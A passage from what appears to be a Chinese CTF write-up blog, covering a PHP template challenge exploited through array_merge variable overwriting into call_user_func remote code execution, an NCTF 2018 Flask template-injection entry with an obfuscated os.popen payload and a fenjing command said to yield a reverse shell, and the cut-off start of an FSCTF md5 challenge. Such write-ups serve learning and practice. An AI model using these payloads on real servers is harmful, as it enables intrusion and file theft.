&#123;</span><br><span class="line">            <span class="variable">$var</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>, <span class="number">0</span>, <span class="title function_ invoke__">strpos</span>(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>));</span><br><span class="line">            <span class="variable">$val</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>, <span class="title function_ invoke__">strpos</span>(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$var</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$system</span>[<span class="variable">$var</span>])) &#123; </span><br><span class="line">                <span class="variable">$system</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$param</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// action</span></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$system</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;function&#x27;</span>:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">return</span>  <span class="string">&#x27;hacker!!&#x27;</span>;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;hacker!!&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$force</span> = <span class="variable">$param</span>[<span class="string">&#x27;force&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$force</span>) &#123;</span><br><span class="line">                    <span class="variable">$p</span> = [];</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$param</span> <span class="keyword">as</span> <span class="variable">$var</span> =&gt; <span class="variable">$t</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$var</span>, <span class="string">&#x27;param&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="variable">$n</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$var</span>, <span class="number">5</span>));</span><br><span class="line">                            <span class="variable">$p</span>[<span class="variable">$n</span>] = <span class="variable">$t</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$p</span>) &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$rt</span> = <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>], <span class="variable">$p</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$rt</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$rt</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;date);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是块代码审计硬骨头。<code>index.php</code>实例化了Temp对象，向构造方法传入POST的变量，调用display方法传get参数filename</p>
<p><code>Class.php</code>用的<code>array_merge()</code>存在变量覆盖特性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、合并一个或多个数组.合并后参数2数组的内容附加在参数1之后。同时如果参数1、2数组中有相同的字符串键名</span><br><span class="line">2、则合并后为参数2数组中对应键的值，发生了覆盖。//注意，会造成变量覆盖</span><br><span class="line">3、然而，如果数组包含数字键名，后面的值将不会覆盖原来的值，而是附加到后面。</span><br><span class="line">4、如果只给了一个数组并且该数组是数字索引的，则键名会以连续方式重新索引。</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array1</span> = <span class="keyword">array</span>(<span class="string">&quot;color&quot;</span> =&gt; <span class="string">&quot;red&quot;</span>, <span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line"><span class="variable">$array2</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;color&quot;</span> =&gt; <span class="string">&quot;green&quot;</span>, <span class="string">&quot;shape&quot;</span> =&gt; <span class="string">&quot;trapezoid&quot;</span>, <span class="number">4</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$array1</span>, <span class="variable">$array2</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">    </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [color] =&gt; green</span></span><br><span class="line"><span class="comment">    [0] =&gt; 2</span></span><br><span class="line"><span class="comment">    [1] =&gt; 4</span></span><br><span class="line"><span class="comment">    [2] =&gt; a</span></span><br><span class="line"><span class="comment">    [3] =&gt; b</span></span><br><span class="line"><span class="comment">    [shape] =&gt; trapezoid</span></span><br><span class="line"><span class="comment">    [4] =&gt; 4</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></table></figure>

<p><code>display()</code>实现如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$space</span>=<span class="string">&#x27;&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">extract</span>(<span class="variable">$this</span>-&gt;date);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getTempName</span>(<span class="variable">$template</span>,<span class="variable">$space</span>);</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;template);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>跟进<code>getTempName()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTempName</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$dir</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$dir</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;template = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;./template/admin/&#x27;</span>.<span class="variable">$template</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_file</span>(<span class="variable">$this</span>-&gt;template))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;template = <span class="string">&#x27;./template/index.html&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>前期准备扫目录时发现了&#x2F;template&#x2F;admin路径，调用的listdata方法，跟进</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">listdata</span>(<span class="params"><span class="variable">$_params</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$system</span> = [<span class="string">&#x27;db&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;app&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;num&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;sum&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;form&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;page&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;site&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;not_flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;show_flag&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;more&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;catid&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;field&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;order&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;space&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;table&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;table_site&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;total&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;join&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;on&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;return&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;sbpage&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;module&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;urlrule&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;pagesize&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;pagefile&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,];</span><br><span class="line">        <span class="variable">$param</span> = <span class="variable">$where</span> = [];</span><br><span class="line">        <span class="comment">//去除字符串首尾处的空白字符</span></span><br><span class="line">        <span class="variable">$_params</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_params</span>);</span><br><span class="line">		<span class="comment">//使用一个字符串分割另一个字符串，代码中以空格为分割，将$_params属性分割成一个数组$params[]，比如说原来$_params=&quot;zhi shi xue bao&quot;，经过explode函数处理后变为$params=[&quot;zhi&quot;,&quot;shi&quot;,&quot;xue&quot;,&quot;bao&quot;]</span></span><br><span class="line">        <span class="variable">$params</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27; &#x27;</span>, <span class="variable">$_params</span>);</span><br><span class="line">   		<span class="comment">//检查数组中是否存在某个值</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$params</span>[<span class="number">0</span>], [<span class="string">&#x27;list&#x27;</span>,<span class="string">&#x27;function&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$params</span>[<span class="number">0</span>] = <span class="string">&#x27;action=&#x27;</span>.<span class="variable">$params</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="comment">//遍历给定的 params 数组</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$params</span> <span class="keyword">as</span> <span class="variable">$t</span>) &#123;</span><br><span class="line">            <span class="comment">//substr:返回字符串的子串,第一个参数是“母串”，第二个参数是起始位置，第三个参数是长度。如果没有第三个参数就意味着从起始位置截取到最后。</span></span><br><span class="line">            <span class="comment">//strpos:查找字符串首次出现的位置</span></span><br><span class="line">            <span class="comment">//$var为$t中等号前的所有。</span></span><br><span class="line">            <span class="comment">//$val为$t中等号后的所有。</span></span><br><span class="line">            <span class="variable">$var</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>, <span class="number">0</span>, <span class="title function_ invoke__">strpos</span>(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>));</span><br><span class="line">            <span class="variable">$val</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>, <span class="title function_ invoke__">strpos</span>(<span class="variable">$t</span>, <span class="string">&#x27;=&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">            <span class="comment">//即$t不是“xxx=xxx”形式，而是“xxx”形式</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$var</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$system</span>[<span class="variable">$var</span>])) &#123;</span><br><span class="line">                <span class="variable">$system</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$param</span>[<span class="variable">$var</span>] = <span class="variable">$val</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// action</span></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$system</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;function&#x27;</span>:<span class="comment">//111</span></span><br><span class="line">                <span class="comment">//$param[&#x27;name&#x27;]存在</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">return</span>  <span class="string">&#x27;hacker!!&#x27;</span>;</span><br><span class="line">                <span class="comment">//function_exists()：如果给定的函数已经被定义就返回TRUE</span></span><br><span class="line">                <span class="comment">//即$param[&#x27;name&#x27;]作为函数已经被定义</span></span><br><span class="line">                &#125; <span class="keyword">elseif</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;hacker!!&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$force</span> = <span class="variable">$param</span>[<span class="string">&#x27;force&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span> (!<span class="variable">$force</span>) &#123;</span><br><span class="line">                    <span class="variable">$p</span> = [];</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$param</span> <span class="keyword">as</span> <span class="variable">$var</span> =&gt; <span class="variable">$t</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$var</span>, <span class="string">&#x27;param&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="comment">//intval:获取变量的整数值</span></span><br><span class="line">                            <span class="variable">$n</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$var</span>, <span class="number">5</span>));</span><br><span class="line">                            <span class="variable">$p</span>[<span class="variable">$n</span>] = <span class="variable">$t</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$p</span>) &#123;</span><br><span class="line">                        <span class="comment">//call_user_func_array:调用回调函数，并把一个数组参数作为回调函数的参数</span></span><br><span class="line">                        <span class="variable">$rt</span> = <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>], <span class="variable">$p</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">//call_user_func:第一个参数是被调用的回调函数，其余参数是回调函数的参数。</span></span><br><span class="line">                        <span class="variable">$rt</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable">$rt</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:<span class="comment">//222</span></span><br><span class="line">                <span class="comment">//将$this-&gt;date进行json格式的编码，并且输出</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$this</span>-&gt;date);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的东西有点太繁杂，需要整理一下，接下来这段内容需要和代码同步着看，否则一定会头昏脑涨。</p>
<p>首先在index里传get参数filename就会执行display，经过extract执行getTempName最后include该template</p>
<p>在&#x2F;template&#x2F;admin&#x2F;路由下存在一个listdata方法，里面有<code>call_user_func_array()</code>和<code>call_user_func()</code>，利用后者的话，就要调用listdata，所以在template&#x2F;admin&#x2F;index.html路由下，为了顺利走完getTempName从而为利用后面的漏洞函数做准备，第一步要先让<code>$dir===&#39;admin&#39;</code>为true，我们可以控制space&#x3D;admin。为什么呢？因为构造方法<code>__construct</code>接收的就是我们POST进去的参数，在这里传入，然后通过里面的<code>array_merge</code>完成我们的赋值，这样dir就会等于admin，就可以继续往下走了。至于为什么dir可以是space，这很简单，在display函数实现的地方形参的名字是space，在getTempName函数实现的地方，第二个形参是dir：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$space</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="title">public</span> <span class="title">function</span> <span class="title">getTempName</span>(<span class="params"><span class="variable">$template</span>,<span class="variable">$dir</span></span>)</span></span><br></pre></td></tr></table></figure>

<p>我们可以稍加留意下listdata里面的system数组中的一大堆键名。</p>
<p>接着讲怎么走到漏洞函数，除了dir&#x3D;&#x3D;admin，另一个条件是template&#x3D;index.html，是html文件，因为我们进入了第一个if之后紧接着就来到了</p>
<p><code>if(!is_file($this-&gt;template))</code></p>
<p>那么我们的template是文件，就可以不进入里面的die了，也就是顺利执行了getTempName。怎么控制template&#x3D;index.html呢？别忘了在index.php里面有这样一句</p>
<p><code>$temp-&gt;display($_GET[&#39;filename&#39;]);</code></p>
<p>那我们就可以get传filename&#x3D;index.html了。至此，初步的赋值完成，来细细的啃listdata：</p>
<p>最终要走进这里实现rce</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$p</span>) &#123;</span><br><span class="line">    <span class="variable">$rt</span> = <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>], <span class="variable">$p</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$rt</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$param</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$rt</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果带<code>$p</code>玩，那么就相当于要执行<code>system(&#39;ls&#39;)</code>这样的，如果不带，就执行无参的函数<code>phpinfo()</code>，理解了第一种，第二种就相当于把跟<code>$p</code>相关的处理无视掉就可以了。</p>
<p>我们要的是，<code>$param[&#39;name&#39;]=system</code>，先纵观整个switch语句，首先action&#x3D;function，才有后续的内容，这是我们需要控制的一个地方。接着走，需要绕过第一个</p>
<p><code>if(!isset($param[&#39;name&#39;]))</code></p>
<p>这和我们的目的殊途同归，所以无视之，走进</p>
<p><code>elseif(!function_exists($param[&#39;name&#39;]))</code>那么phpinfo是内置的函数，肯定是定义了的，也可以顺利通过。接下来，到了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$force</span>=<span class="variable">$param</span>[<span class="string">&#x27;force&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!force)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那我们要让force&#x3D;false，才有后续。继续，定义了数组p，遍历param里的值，赋给循环中的t，接着一个<code>if(strpos($var,&#39;param&#39;)===0)</code>此处保证的是<code>$var=&#39;param0xxxxx&#39;</code>，通过下面的<code>intval(substr($var,5))</code>，也就是<code>intval(&#39;0xxxxx&#39;)</code>导致<code>$n=0</code>，下一句就是<code>$p[$n]=$t;</code>，所以<code>$p[0]=$t;</code></p>
<p>其中的<code>$t</code>，就是我们可以控制的<code>$var=cmd</code></p>
<p>那么param的前身是个空数组，通过的是<code>foreach($params as $t)</code>进入一个if循环里赋值得来的。所以再去找<code>$params</code>，那么listdata传入的形参叫做<code>$_params</code>，通过<code>trim()</code>进行分割得到的。而trim函数就是用空格来分割的，所以我们最终传入的<code>$_params</code>想要分割就用空格，接着走到一个if语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$params</span>[<span class="number">0</span>],[<span class="string">&#x27;list&#x27;</span>,<span class="string">&#x27;function&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$params</span>[<span class="number">0</span>]=<span class="string">&#x27;action=&#x27;</span>.<span class="variable">$params</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们从先前的action就可以知道，<code>$params[0]</code>其实要么是list要么是function，所以这里<code>$params[0]</code>最终一定会在前面加上一个<code>action=</code></p>
<p>目前来看，我们要的是<code>$_params=function name=system force=false param0xxxx=ls</code>。</p>
<p>继续走，我们到<code>template/admin/index.html</code>里，发现页面是这样回显的：</p>
<p><code>listdata(&quot;action=list module = $mod&quot;);?&gt;</code></p>
<p>这就有意思了，服务器这该死的设计让我们的第一个action强行等于list!，只留下一个module &#x3D; $mod是我们可控的，那我们最终的payload会变成这样：</p>
<p><code>$mod=xxxx action=function name=system force=false param0xxxx=cmd</code></p>
<p>这其实没有关系，要的是一个变量覆盖，该调用调用，所以最终payload就是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?filename=index.html</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">space=admin&amp;mod=xxx action=function name=phpinfo</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?filename=index.html</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">space=admin&amp;mod=xxx action=function name=system param=cat$&#123;IFS&#125;/f*&gt;/var/www/html/a</span><br></pre></td></tr></table></figure>

<h1 id="156-NCTF-2018-Flask-PLUS"><a href="#156-NCTF-2018-Flask-PLUS" class="headerlink" title="156.[NCTF 2018]Flask PLUS"></a>156.[NCTF 2018]Flask PLUS</h1><p><code>python3 -m fenjing crack-path -u &#39;url&#39;</code></p>
<p>就会反弹shell了</p>
<p>payload:</p>
<p><code>&#123;%set xv='so'[::-1]%&#125;&#123;&#123;lipsum.__globals__['__b''uiltins__']['__i''mport__'](xv)['po''pen']("\x63\x61\x74\x20\x2f\x54\x68\x31\x73\x5f\x69\x73\x5f\x5f\x46\x31\x31\x31\x34\x67").read()&#125;&#125;</code></p>
<h1 id="157-FSCTF-2023-ez-php1"><a href="#157-FSCTF-2023-ez-php1" class="headerlink" title="157.[FSCTF 2023]ez_php1"></a>157.[FSCTF 2023]ez_php1</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;globals.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>!=<span class="variable">$b</span>&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;!!!&quot;</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span 